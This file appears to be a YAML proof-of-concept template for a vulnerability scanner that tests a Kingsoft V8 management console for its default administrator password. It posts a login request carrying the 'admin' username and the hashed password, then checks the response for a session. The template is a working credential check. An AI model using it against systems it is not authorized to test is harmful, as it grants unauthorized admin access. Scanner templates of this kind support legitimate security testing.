id: poc-yaml-kingsoft-v8-default-password
info:
  name: Kingsoft V8 默认密码漏洞
  severity: medium
  tags:
  - 访问控制错误
  finger: Kingsoft
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: POST
  path: /inter/ajax.php?cmd=get_user_login_cmd
  headers: {}
  data: '{"get_user_login_cmd":{"name":"admin","password":"21232f297a57a5a743894a0e4a801fc3"}}'
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, "ADMIN") && contains(body, "userSession")
  output: []
